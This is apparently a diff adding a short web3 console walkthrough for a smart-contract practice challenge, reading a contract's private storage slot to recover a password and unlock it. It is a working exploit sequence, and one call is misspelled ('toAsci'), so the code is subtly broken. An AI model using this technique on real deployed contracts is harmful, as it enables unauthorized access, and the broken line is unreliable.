@@ -1,1 +1,19 @@
 
+//This is all done through the console.
+
+web3.eth.getStorageAt(contract.address, 1, function(err, result) { pwd = result})
+
+promise
+pwd
+
+//number shown here
+
+web3.utils.toAsci(pwd)
+
+//This will reveal the password
+
+contract.unlock(pwd)
+
+await contract.locked()
+
+//this will confirm if the contract has been unlocked
